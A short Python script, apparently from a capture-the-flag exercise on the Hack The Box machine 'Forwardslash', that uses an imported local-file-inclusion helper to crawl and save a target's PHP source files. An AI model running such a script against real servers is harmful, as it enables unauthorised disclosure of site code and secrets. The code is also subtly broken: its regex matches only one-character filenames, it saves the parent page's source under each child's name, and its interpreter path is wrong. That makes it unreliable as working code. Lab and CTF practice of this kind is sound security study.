#!/src/bin/python3
#
# from IPPSEC video - https://www.youtube.com/watch?v=alJa51XylDE
#  HTB - Machine - Forwardslash
#
from lfi2 import *  # a modified version of lfi.py
import re

crawled =[]

def crawl(page):
	source = get_source(page)
	if not source:
		print(f"Failed to download {page}")
		return
	#ToDo: Allow regex to parse URL's, right now it only grabs filenames
	files = re.findall(r'([a-z0-9]\-*\.php)', source)
	for i in files:
		if i not in crawled:
			crawled.append(i)
			save_file(i, source)
			crawl(i)
	
if __name__ == '__main__':
	crawl('index.php')
	